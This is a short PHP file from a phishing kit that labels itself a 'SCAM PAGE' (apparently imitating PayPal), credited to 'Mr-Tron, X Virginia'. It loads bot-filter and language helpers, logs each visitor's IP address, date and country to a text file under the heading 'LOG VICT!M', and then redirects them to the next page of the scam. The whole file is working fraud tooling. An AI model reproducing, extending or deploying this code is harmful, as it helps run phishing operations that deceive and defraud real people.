<?php
//<!-- SCAM PAGE PPL V3 #By Mr-Tron, X Virginia  -->
include ('./X-Virginia-V3/bt.php');
include ('./X-Virginia-V3/makelang.php');
$milaf = fopen("VST.txt","a");
fwrite($milaf,$ib."  -| LOG VICT!M !! |-   ".$dt."                  -        " . $cntc ."\n");
header('Location: newdir.php');
?>

